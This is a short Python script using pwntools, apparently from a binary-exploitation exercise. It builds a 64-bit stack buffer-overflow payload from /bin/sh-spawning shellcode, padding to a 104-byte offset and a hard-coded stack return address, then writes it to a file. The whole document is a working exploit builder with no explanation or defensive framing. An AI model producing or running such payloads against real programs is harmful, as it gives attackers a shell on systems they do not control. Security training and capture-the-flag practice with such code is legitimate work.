#!/usr/bin/env python3
from pwn import *

# Set the architecture context to 64-bit
context.arch = 'amd64'

# Generate shellcode for spawning /bin/sh
shellcode = asm(shellcraft.sh())

# Define constants
buffer_offset = 104  # Offset to the return address (RIP)
return_address = 0x7fffffffdd30  # Address where shellcode is expected (adjust as needed)

# Create the payload
payload = b''

# Add the shellcode
payload += shellcode

# Add padding to reach the return address
padding_length = buffer_offset - len(shellcode)
if padding_length < 0:
    raise ValueError(f"Shellcode too large ({len(shellcode)} bytes) for buffer offset ({buffer_offset} bytes)")
payload += b'A' * padding_length

# Add the return address (little-endian)
payload += p64(return_address)

# Write the payload to a file
with open("payload6", "wb") as f:
    f.write(payload)

# Print payload details for inspection
print(f"Shellcode length: {len(shellcode)} bytes")
print(f"Total payload length: {len(payload)} bytes")
print(f"Payload (hex, first 100 chars): {payload.hex()[:100]}...")
